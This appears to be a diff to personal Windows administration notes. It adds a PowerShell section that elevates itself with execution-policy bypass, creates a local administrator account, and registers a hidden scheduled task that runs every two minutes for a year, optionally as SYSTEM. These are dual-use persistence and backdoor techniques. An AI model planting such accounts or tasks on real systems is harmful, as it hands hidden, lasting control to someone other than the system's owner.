@@ -22,3 +22,90 @@ mstsc /shadow:# /control
 ----
 
 NOTE: Use `quser` to get the user id.
+
+
+== dump
+
+[,powershhell]
+----
+function Test-Administrator {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Request-AdminElevation {
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Start-Process -FilePath PowerShell.exe -ArgumentList $arguments -Verb RunAs -Wait
+}
+
+function Create-Root {
+    param(
+        [string]$Username,
+        [string]$Password
+    )
+    
+    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+    New-LocalUser -Name $Username -Password $SecurePassword
+    Add-LocalGroupMember -Group "Administrators" -Member $Username
+}
+
+function Create-Task {
+    param(
+        [Parameter(Mandatory)]
+        [ValidateNotNullOrEmpty()]
+        [string]$TaskName,
+        
+        [Parameter(Mandatory)]
+        [ValidateScript({Test-Path $_})]
+        [string]$ScriptPath,
+        
+        [switch]$IsPriv,
+        
+        [int]$IntervalMinutes = 2,
+        
+        [int]$RepetitionDays = 365
+    )
+    
+    $ScriptPath = (Resolve-Path $ScriptPath).Path
+    
+    $Action = New-ScheduledTaskAction `
+        -Execute "powershell.exe" `
+        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+    
+    $Trigger = New-ScheduledTaskTrigger `
+        -Once `
+        -At (Get-Date) `
+        -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) `
+        -RepetitionDuration (New-TimeSpan -Days $RepetitionDays)
+    
+    $Settings = New-ScheduledTaskSettingsSet `
+        -StartWhenAvailable `
+        -AllowStartIfOnBatteries `
+        -DontStopIfGoingOnBatteries
+    
+    Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | 
+        Unregister-ScheduledTask -Confirm:$false
+    
+    $Principal = if ($IsPriv) {
+        New-ScheduledTaskPrincipal `
+            -UserId "SYSTEM" `
+            -LogonType ServiceAccount `
+            -RunLevel Highest
+    }
+    
+    $RegisterParams = @{
+        TaskName = $TaskName
+        Action = $Action
+        Trigger = $Trigger
+        Settings = $Settings
+    }
+    
+    if ($Principal) {
+        $RegisterParams['Principal'] = $Principal
+    }
+    
+    Register-ScheduledTask @RegisterParams
+}
+
+----
